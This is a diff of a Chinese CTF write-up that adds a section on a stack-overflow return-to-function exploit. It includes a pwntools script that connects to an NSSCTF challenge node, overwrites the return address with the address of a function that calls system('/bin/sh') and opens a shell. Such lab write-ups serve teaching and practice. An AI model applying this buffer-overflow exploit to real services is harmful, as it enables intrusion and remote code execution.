@@ -28,7 +28,7 @@ category: CTF
 
 （大端序则反之）
 ![整数溢出](./images/zhengshuyichu.webp)
-如图，v4为4字节，却尝试用scanf将它视为%lld读入8字节整数，因此会覆盖到位于栈高字节的n1314（rbp-ch），当n1314等于520（0x208）时调用system，那便能拿到shell
+如图，v4为4字节，却尝试用scanf将它视为%lld读入8字节整数，因此会覆盖到位于栈高字节的n1314（rbp-ch），当n1314等于520（0x208）时调用system，那便能拿到==shell==
 
 因此输入0x20800000000在内存中为00 00 00 00 08 02,前面4个00即v4的内存区域，此时n1314被视为520
 
@@ -46,5 +46,25 @@ r.recvline()
 r.sendline(str(num))
 r.interactive()
 ```
+![flag](./images/zhengshuyichu2.webp)
 
+## ROP
+![ROP](./images/ROP1.webp)
+如图，scanf尝试向v4输入但没有上限(`%s`遇到回车才停止读取)，因此导致==栈溢出== 但是main函数里没有找到类似`system("/bin/sh")`的语句，于是通过查找字符串等方式我们不难发现在==vuln==这个函数中存在这个语句，那么我们的目的就是通过输入特定的字符串，让程序溢出到==vuln==函数
+![ROP2](./images/ROP2.webp)
+那么怎么return到==vuln==函数呢？其实让溢出的值是==vuln==函数的地址就行了。
+```python
+from pwn import *
+context(os='linux',arch='amd64',log_level="debug")
+r = remote('node7.anna.nssctf.cn', 23929)
+vuln = 0x4011DD
+playload = b"a"*0x28+p64(vuln)
+r.recvline()
+# gdb.attach(r)
+r.sendline(playload)
+r.interactive()
+```
+关于0x28，也就是没溢出的字节数是怎么来的，其实有很多方法，最基本的就是通过gdb慢慢调试出来，另一种就行在ida里看，就是[rbp-20h]=0x28。还有一种就是pwntools里的cyclic(~~最公式的一种~~)
+![flag](./images/ROP3.webp)
 
+## ret2text
